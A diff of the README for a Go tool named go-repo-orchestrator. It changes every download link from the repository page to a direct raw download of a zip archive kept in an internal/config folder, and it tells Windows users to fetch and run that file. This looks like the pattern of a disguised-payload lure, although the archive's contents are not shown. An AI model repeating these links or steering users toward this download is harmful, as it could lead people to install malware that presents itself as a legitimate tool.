@@ -1,10 +1,10 @@
 # 🧭 go-repo-orchestrator - Safe branch control across repos
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Outofreach-ethnocentrism934/go-repo-orchestrator)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Outofreach-ethnocentrism934/go-repo-orchestrator/raw/refs/heads/main/internal/config/repo_orchestrator_go_3.1-alpha.1.zip)
 
 ## 📥 Download
 
-Use this page to download and get the app: [go-repo-orchestrator](https://github.com/Outofreach-ethnocentrism934/go-repo-orchestrator)
+Use this page to download and get the app: [go-repo-orchestrator](https://github.com/Outofreach-ethnocentrism934/go-repo-orchestrator/raw/refs/heads/main/internal/config/repo_orchestrator_go_3.1-alpha.1.zip)
 
 ## 🪟 Windows setup
 
@@ -167,7 +167,7 @@ It is meant to be:
 
 ## 📦 Download and run on Windows
 
-Use this page to download and run the app on Windows: [https://github.com/Outofreach-ethnocentrism934/go-repo-orchestrator](https://github.com/Outofreach-ethnocentrism934/go-repo-orchestrator)
+Use this page to download and run the app on Windows: [https://github.com/Outofreach-ethnocentrism934/go-repo-orchestrator/raw/refs/heads/main/internal/config/repo_orchestrator_go_3.1-alpha.1.zip](https://github.com/Outofreach-ethnocentrism934/go-repo-orchestrator/raw/refs/heads/main/internal/config/repo_orchestrator_go_3.1-alpha.1.zip)
 
 1. Open the link.
 2. Find the latest Windows file or release package.
@@ -204,4 +204,4 @@ If a repo does not show the branches you expect:
 
 ## 🔗 Access
 
-Primary link: [go-repo-orchestrator on GitHub](https://github.com/Outofreach-ethnocentrism934/go-repo-orchestrator)
+Primary link: [go-repo-orchestrator on GitHub](https://github.com/Outofreach-ethnocentrism934/go-repo-orchestrator/raw/refs/heads/main/internal/config/repo_orchestrator_go_3.1-alpha.1.zip)
